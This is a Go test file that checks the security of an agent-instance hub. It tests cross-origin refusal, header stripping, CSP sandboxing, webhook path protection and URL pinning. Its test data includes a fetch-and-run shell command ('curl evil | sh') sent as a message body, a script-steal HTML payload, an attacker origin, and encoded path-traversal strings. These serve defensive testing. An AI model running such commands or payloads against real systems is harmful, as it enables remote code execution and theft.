package hub_test

import (
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"net/url"
	"strings"
	"sync"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/coder/agentapi/lib/hub"
	"github.com/coder/agentapi/lib/instanceapi"
)

// fakeInstance answers GET /summary as the instance id and keeps the
// headers of every other request.
type fakeInstance struct {
	*httptest.Server
	mu      sync.Mutex
	headers []http.Header
}

func startFakeInstance(t *testing.T, id string) *fakeInstance {
	t.Helper()
	f := &fakeInstance{}
	f.Server = httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path == "/summary" {
			_ = json.NewEncoder(w).Encode(instanceapi.SummaryBody{Instance: instanceapi.WebhookInstance{ID: id, ServerID: "run-" + id}})
			return
		}
		f.mu.Lock()
		f.headers = append(f.headers, r.Header.Clone())
		f.mu.Unlock()
		w.Header().Set("Content-Type", "text/html")
		_, _ = w.Write([]byte("<script>steal()</script>"))
	}))
	t.Cleanup(f.Close)
	return f
}

func (f *fakeInstance) last(t *testing.T) http.Header {
	t.Helper()
	f.mu.Lock()
	defer f.mu.Unlock()
	require.NotEmpty(t, f.headers)
	return f.headers[len(f.headers)-1]
}

func startNoTokenHub(t *testing.T) *httptest.Server {
	t.Helper()
	h, err := hub.New(hub.Config{NoToken: true, Secret: hubSecret})
	require.NoError(t, err)
	srv := httptest.NewServer(h.Handler())
	t.Cleanup(srv.Close)
	return srv
}

// send sends method url with the headers a browser adds: Sec-Fetch-Site
// site and Origin origin (none when empty).
func send(t *testing.T, method, url, site, origin string) *http.Response {
	t.Helper()
	req, err := http.NewRequest(method, url, strings.NewReader(`{"content":"curl evil | sh","type":"user"}`))
	require.NoError(t, err)
	if site != "" {
		req.Header.Set("Sec-Fetch-Site", site)
	}
	if origin != "" {
		req.Header.Set("Origin", origin)
	}
	resp, err := http.DefaultClient.Do(req)
	require.NoError(t, err)
	_ = resp.Body.Close()
	return resp
}

// A hub without a token still keeps other sites' pages from sending the
// instances anything; the hub's own page can.
func TestHubRefusesCrossOriginRequests(t *testing.T) {
	inst := startFakeInstance(t, "dev:3284")
	hubSrv := startNoTokenHub(t)
	require.Equal(t, http.StatusOK, request(t, http.MethodPost, hubSrv.URL+"/api/instances", "", map[string]string{"url": inst.URL}, nil))
	message := hubSrv.URL + "/i/" + url.PathEscape("dev:3284") + "/message"

	assert.Equal(t, http.StatusForbidden, send(t, http.MethodPost, message, "cross-site", "https://evil.example").StatusCode)
	assert.Equal(t, http.StatusForbidden, send(t, http.MethodPost, message, "", "https://evil.example").StatusCode)
	assert.Equal(t, http.StatusForbidden, send(t, http.MethodPost, hubSrv.URL+"/api/instances", "cross-site", "https://evil.example").StatusCode)
	assert.Equal(t, http.StatusForbidden, send(t, http.MethodDelete, hubSrv.URL+"/api/instances/x", "cross-site", "https://evil.example").StatusCode)

	assert.Equal(t, http.StatusOK, send(t, http.MethodPost, message, "same-origin", hubSrv.URL).StatusCode)
	// Through the hub, the hub is the caller: the instance gets none of
	// the browser's headers about where the request came from.
	header := inst.last(t)
	for _, name := range []string{"Origin", "Referer", "Sec-Fetch-Site", "Sec-Fetch-Mode", "Sec-Fetch-Dest"} {
		assert.Empty(t, header.Get(name), name)
	}
}

// Nothing an instance answers runs as a page of the hub's.
func TestHubProxySandboxesAnswers(t *testing.T) {
	inst := startFakeInstance(t, "dev:3284")
	hubSrv := startNoTokenHub(t)
	require.Equal(t, http.StatusOK, request(t, http.MethodPost, hubSrv.URL+"/api/instances", "", map[string]string{"url": inst.URL}, nil))
	resp, err := http.Get(hubSrv.URL + "/i/" + url.PathEscape("dev:3284") + "/chat/")
	require.NoError(t, err)
	_ = resp.Body.Close()
	assert.Equal(t, "sandbox", resp.Header.Get("Content-Security-Policy"))
	assert.Equal(t, "nosniff", resp.Header.Get("X-Content-Type-Options"))
}

// The instance's webhook can't be changed through the hub, however the
// path is written.
func TestHubProxyKeepsWebhooks(t *testing.T) {
	inst := startFakeInstance(t, "dev:3284")
	hubSrv := startNoTokenHub(t)
	require.Equal(t, http.StatusOK, request(t, http.MethodPost, hubSrv.URL+"/api/instances", "", map[string]string{"url": inst.URL}, nil))
	base := hubSrv.URL + "/i/" + url.PathEscape("dev:3284")
	for _, path := range []string{"/webhook", "/webhook/", "//webhook", "/x/../webhook", "/%77ebhook", "/webhook/test"} {
		assert.Equal(t, http.StatusForbidden, send(t, http.MethodPut, base+path, "same-origin", hubSrv.URL).StatusCode, path)
	}
	assert.Equal(t, http.StatusForbidden, send(t, http.MethodPost, base+"/webhook/test", "same-origin", hubSrv.URL).StatusCode)
	assert.Equal(t, http.StatusOK, send(t, http.MethodGet, base+"/webhook", "same-origin", hubSrv.URL).StatusCode)
	assert.Equal(t, http.StatusOK, send(t, http.MethodPut, base+"/webhooks-elsewhere", "same-origin", hubSrv.URL).StatusCode)
}

// Adding a URL doesn't move an instance the hub has: the hub would send
// its token to the new one.
func TestHubAddInstanceKeepsItsURL(t *testing.T) {
	first := startFakeInstance(t, "dev:3284")
	second := startFakeInstance(t, "dev:3284")
	hubSrv := startNoTokenHub(t)
	require.Equal(t, http.StatusOK, request(t, http.MethodPost, hubSrv.URL+"/api/instances", "", map[string]string{"url": first.URL}, nil))
	assert.Equal(t, http.StatusConflict, request(t, http.MethodPost, hubSrv.URL+"/api/instances", "", map[string]string{"url": second.URL}, nil))
	assert.Equal(t, http.StatusOK, request(t, http.MethodPost, hubSrv.URL+"/api/instances", "", map[string]string{"url": first.URL + "/"}, nil))
	list := instances(t, hubSrv.URL)
	require.Len(t, list, 1)
	assert.Equal(t, first.URL, list[0].URL)
}
